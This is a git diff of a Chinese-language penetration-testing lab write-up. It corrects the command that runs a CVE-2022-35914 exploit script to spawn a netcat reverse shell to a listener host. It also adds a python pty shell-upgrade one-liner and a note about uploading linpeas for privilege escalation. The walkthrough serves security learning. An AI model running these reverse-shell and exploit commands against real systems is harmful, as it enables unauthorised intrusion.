@@ -59,7 +59,7 @@ nmap -sC -sV -p- -oA law 192.168.210.190 --open
 * 根据利用脚本的帮助信息，可以指定执行的命令，因此直接指定反弹shell：
 
 ```bash
-python3 CVE-2022-35914.py -u http://192.168.228.190 -c 'nc -e /b.168.45.161 4444'
+python3 CVE-2022-35914.py -u http://192.168.228.190 -c 'nc -e /bin/sh 192.168.45.161 4444'
 ```
 
 <figure><img src="../.gitbook/assets/12.png" alt=""><figcaption></figcaption></figure>
@@ -70,11 +70,19 @@ python3 CVE-2022-35914.py -u http://192.168.228.190 -c 'nc -e /b.168.45.161 4444
 
 <figure><img src="../.gitbook/assets/14.png" alt=""><figcaption></figcaption></figure>
 
+```bash
+# 升级shell
+find / -name python*
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
 ## 权限提升
 
 ### 本地信息收集
 
-*
+* 简单的手动枚举没有什么能利用的，决定上传linpeas进行本地信息收集：
+
+
 
 
 
